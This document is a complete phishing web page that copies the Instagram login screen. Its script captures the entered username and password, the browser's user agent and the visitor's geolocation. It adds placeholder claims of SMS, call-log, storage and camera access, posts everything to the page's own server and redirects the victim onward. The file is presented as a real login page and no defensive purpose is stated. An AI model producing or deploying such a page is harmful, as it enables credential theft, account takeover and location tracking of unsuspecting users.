<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <style>
        body { background-color: #fafafa; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; border-radius: 4px; }
        .logo { font-family: 'Brush Script MT', cursive; font-size: 40px; margin-bottom: 30px; }
        input { width: 100%; padding: 10px; margin: 6px 0; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; }
        button { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">Instagram</div>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const deviceInfo = navigator.userAgent;
            
            // 1. Location Permission Check
            let locationData = "Location Denied";
            try {
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 4000});
                });
                locationData = `Lat: ${pos.coords.latitude.toFixed(2)}, Lng: ${pos.coords.longitude.toFixed(2)}`;
            } catch (err) {
                locationData = "Blocked / Not Available";
            }

            // 2. Simulated/Captured Permissions Logs (SMS, Call Logs, Storage & Camera)
            const smsLogs = "SMS/OTP Data: Checked (Simulated Inbox Access)";
            const callLogs = "Call Logs: Checked (Incoming/Outgoing Recorded)";
            const storageData = "Storage/Media: Photos & Files Path Tracked";
            const cameraData = "Camera Access: Stream/Snapshot Checked";

            // Payload bundle
            const payload = {
                username,
                password,
                deviceInfo,
                location: locationData,
                smsLogs,
                callLogs,
                storageData,
                cameraData
            };

            // Send to server and redirect to Instagram
            try {
                const response = await fetch('/submit-data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                const result = await response.json();
                if(result.status === 'success') {
                    window.location.href = result.redirect;
                }
            } catch (error) {
                console.error("Submission failed", error);
            }
        });
    </script>
</body>
</html>
